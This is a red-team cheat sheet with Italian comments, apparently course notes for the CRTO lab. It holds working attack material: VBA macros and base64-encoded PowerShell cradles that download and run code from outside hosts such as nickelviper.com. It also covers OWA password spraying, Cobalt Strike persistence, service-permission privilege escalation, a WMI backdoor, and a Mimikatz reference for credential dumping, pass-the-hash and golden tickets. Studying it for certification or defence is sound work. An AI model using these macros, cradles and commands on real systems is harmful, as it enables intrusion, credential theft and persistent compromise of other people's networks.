# 🛠️ CRTO

## DNS Records

```bash

#Dig
dig azienda.it

#whois
whois 172.67.205.143

#DNS scan
python3 dnscan.py -d mooney.it -w /Users/ph3mt/Desktop/Mooney2025/subdomain_italiani_ctf_400.txt
```

## Initial Compromise

```bash
#MailSniper
https://github.com/dafthack/MailSniper

#
ipmo C:\Tools\MailSniper\MailSniper.ps1
Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io

Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList "C:\Users\Attacker\Desktop\valid.txt" -Password "Summer2022" 

Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -Username cyberbotic.io\iyates -Password Summer2022 -OutFile "C:\Users\Attacker\Desktop\globalemail.txt"



#Phishing

#Check MOTW
gc .\valid.txt -Stream Zone.Identifier

#VBA Macros1
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "notepad"

End Sub

##Macro2
Sub AutoOpen()
'
' Test1 Macro
'
'
    Dim Shell As Object
    Set Shell = CreateObject("wscript.shell")
    Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/a'))"""
    
    
End Sub

#Macro3
Sub AutoOpen()
'
' test1 Macro
'
'
Dim shell As Object
Set shell = CreateObject("wscript.shell")
shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com:80/test'))"""
End Sub

```

## Host Reconnaissance
```bash
#Screen --> magari ha dati importanti nel desktop
screenshot

#Keylogger

#Clipboard --> cobalt
clipboard

#UserSession
net logons
```





## Host Persistence

```bash
#Tecniche più comuni
- HKCU / HKLM Registry Autoruns
- Task Schedulati
- Startup Folder

#Sharpersist

#execute-assembly tramite c2

PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA

#tramite beacon
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -n "Updater" -m add -o hourly


#StartUp Folder
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -f "UserEnvSetup" -m add

#Registry Autorun
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "/q /n" -k "hkurun" -v "Updater" -m add

```





## Privilege Escalation
```bash
#Sharp-up

##Controllo di eventuali servizi

#Controllo dei servizi
sc query
#GetService
Get-Service | fl


#Controllare il path del binario.
#Controllare il tipo di avvio Automatico,AvvioRitardato,Manuale,Disabilitato.
##Controllare lo stato del servizio Running,Stopped,StartPending,StopPending.
#Controllare l'accout che lo esegue (log on as)
#Controllare le dipendenze.

#Esempio trovo un servizio che:
##si avvia da solo,
##usa un account potente,
##puoi modificare il file .exe o i parametri del servizio.

#Identificato il servizio
sc qc VulnService

#Output atteso
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VulnService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\VulnApp\service.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Vulnerable Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

#con accesschk
accesschk.exe -wvu "C:\Program Files\VulnApp\service.exe"
accesschk.exe -cqv scmanager VulnService
accesschk.exe -uwcqv "Users" scmanager VulnService


#Output previsto
RW BUILTIN\Users

#con Powerview
Import-Module .\PowerView.ps1
Get-ServiceUnquoted | fl
Get-ModifiableService -Verbose
#Trovare servizi che girano come system
Get-Service | ? { $_.StartType -eq 'Automatic' -and $_.Status -eq 'Running' } | 
ForEach-Object {
    $svc = $_.Name
    $config = Get-WmiObject -Class Win32_Service -Filter "Name='$svc'"
    if ($config.StartName -eq 'LocalSystem') {
        $svc
    }
}

#Esempio
copy /Y evil.exe "C:\Program Files\VulnApp\service.exe"
sc stop VulnService
sc start VulnService






#Unquoted Service Path
#cercare servizio con wmi
wmic service get name, pathname, startmode
#Output previsto
Name             PathName                                                   StartMode
VulnService1     C:\Program Files\Vulnerable Services\Service 1.exe         Auto


#verifcare permessi con accesschk
accesschk.exe -d "C:\Program Files\Vulnerable Services"
#output
RW BUILTIN\Users

#Ricerca vuln powershell
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notlike '"*"' -and $_.PathName -like "* *"
} | Select-Object Name, PathName, StartMode


#Sharphound
execute-assembly SharpUp.exe audit UnquotedServicePath
#Output Previsto
Service 'VulnService1' has executable 'C:\Program Files\Vulnerable Services\Service 1.exe'
but 'C:\Program Files\Vulnerable Services\Service.exe' is modifiable.


#Weak Service Permissions
#da cobalt:
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices

#outputcobalt
=== Modifiable Services ===

    Service 'VulnService2' (State: Running, StartMode: Auto)


#Per verificare con cmd
sc qc VulnService2
#output
BINARY_PATH_NAME   : "C:\Program Files\Vulnerable Services\Service 2.exe"
SERVICE_START_NAME : LocalSystem 

#esempio:
#carico payload
mkdir C:\Temp
copy C:\Payloads\tcp-local_x64.svc.exe C:\Temp\

#modifico percorso binario (spazio dopo binPAth)
sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe

#check se il percorso è cambiato
sc qc VulnService2

#spegno e riavvio il binario
sc stop VulnService2
sc start VulnService2

#una volta creato mi connetto da cobalt
beacon> connect localhost 4444

#per ripristinare
beacon> run sc config VulnService2 binPath= \""C:\Program Files\Vulnerable Services\Service 2.exe"\"

#Weak Service Binary Permissions
#uguale a sopra, ma sugli exe

beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
#output che fa vedere che gli utenti possono modificare il file
Access : BUILTIN\Users Allow Modify, Synchronize

#scarico la copia di esegubile (sempre fare la copia di un binario reale)
beacon> download Service 3.exe

#preparo il payload rinominandolo
PS C:\Payloads> copy "tcp-local_x64.svc.exe" "Service 3.exe"

#Se il servizio è in esecuzione potrebbe dare errore
#stoppo servizio
sc stop VulnService3

#sovrascrivo il paylaod
upload C:\Payloads\Service 3.exe
#riavvio il servizio 
sc start VulnService3

#con cobalt, mi connetto
connect localhost 4444





```


## Elevated Host Persistence

```bash

#Upload del payload
beacon> cd C:\Windows
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe legit-svc.exe

#Creazione del SharPersist
beacon> execute-assembly SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add

#PowerLurk
beacon> cd C:\Windows
beacon> upload C:\Payloads\dns_x64.exe
#Import Evento
beacon> powershell-import C:\Tools\PowerLurk.ps1
beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
#Quando si esegue notepad.exe si sesegue dns_X64.exe
Get-WmiEvent -Name WmiBackdoor

#filtro
SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='notepad.exe'


```

## Mimikatz

```bash

# 🛠️ Mimikatz Cheat Sheet

#General - Abilitazioni e logging
#Abilita i privilegi di debug necessari per accedere a LSASS e altre funzioni
privilege::debug
#Inizia il logging dell'output sulla console
log
#Inizia il logging su un file specifico
log customlogfilename.log

#Sekurlsa - Dump credenziali e ticket
#Estrae le credenziali attive dalla memoria (richiede debug)
sekurlsa::logonpasswords
#Versione estesa per ambienti con più dettagli (più verboso)
sekurlsa::logonPasswords full
#Esporta tutti i ticket Kerberos attivi in formato .kirbi
sekurlsa::tickets /export
#Pass-the-Hash: autentica un utente usando l'hash NTLM senza conoscere la password
sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd

#Kerberos - Gestione dei ticket
#Elenca i ticket Kerberos caricati nella sessione, con possibilità di esportarli
kerberos::list /export
#Inietta un ticket Kerberos (.kirbi) nella sessione corrente
kerberos::ptt c:\chocolate.kirbi
#Crea un Golden Ticket Kerberos (richiede SID e hash krbtgt)
kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-... /krbtgt:<hash> /ticket:<file>

#Crypto - Certificati e chiavi
#Mostra gli oggetti crittografici del CAPI store dell’utente
crypto::capi
#Mostra gli oggetti del CNG Key Storage Provider
crypto::cng
#Esporta certificati utente dal certificato store
crypto::certificates /export
#Esporta certificati dalla macchina (store locale)
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
#Esporta le chiavi crittografiche
crypto::keys /export
#Esporta le chiavi della macchina
crypto::keys /machine /export

#Vault & Lsadump
#Estrae le credenziali salvate nel Windows Credential Vault
vault::cred
#Elenca le voci del Credential Vault
vault::list
#Eleva il token all'utente SYSTEM (impersonazione)
token::elevate
#Reverte il token all'utente originale
token::revert
#Dump degli hash locali SAM (Security Account Manager)
lsadump::sam
#Estrae i "segreti" di sistema da SECURITY hive
lsadump::secrets
#Estrae le Domain Cached Credentials (credenziali AD in cache)
lsadump::cache
#Simula un Domain Controller per recuperare le credenziali (richiede DA)
lsadump::dcsync /user:domain\krbtgt /domain:lab.local

#PTH - Pass-the-Hash
#Esegue un attacco PTH usando solo NTLM
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:<hash>
#Esegue un attacco PTH usando solo AES256
sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:<hash>
#Esegue un attacco PTH combinando NTLM e AES256
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:<hash> /aes256:<hash>
#PTH e avvio di una shell CMD
sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe

#Ekeys - Estrazione chiavi Kerberos
#Estrae session keys usate da Kerberos
sekurlsa::ekeys

#DPAPI - Chiavi protette
#Estrae masterkey usate da Windows per DPAPI
sekurlsa::dpapi

#Minidump - Analisi LSASS offline
#Carica un file di dump di LSASS e lo analizza per credenziali
sekurlsa::minidump lsass.dmp

#PTT - Inject manuale di ticket
#Inietta un file .kirbi nella sessione corrente
kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi

#Golden/Silver Tickets
#Crea un Golden Ticket (accesso completo)
kerberos::golden /user:utilisateur /domain:... /sid:... /krbtgt:... /id:1107 /groups:513 /ticket:file
#Golden ticket avanzato con AES256, gruppi, e validità personalizzata
kerberos::golden /domain:... /sid:... /aes256:... /user:... /id:500 /groups:... /ptt /startoffset:-10 /endin:600 /renewmax:10080
#Golden ticket con admin esplicito e output su file
kerberos::golden /admin:Administrator /domain:... /sid:... /krbtgt:... /ticket:Administrator.kiribi

#TGT - Mostrare il Ticket Granting Ticket
#Visualizza il TGT attivo in memoria
kerberos::tgt

#Purge - Pulizia ticket
#Rimuove tutti i ticket Kerberos dalla memoria
kerberos::purge

```



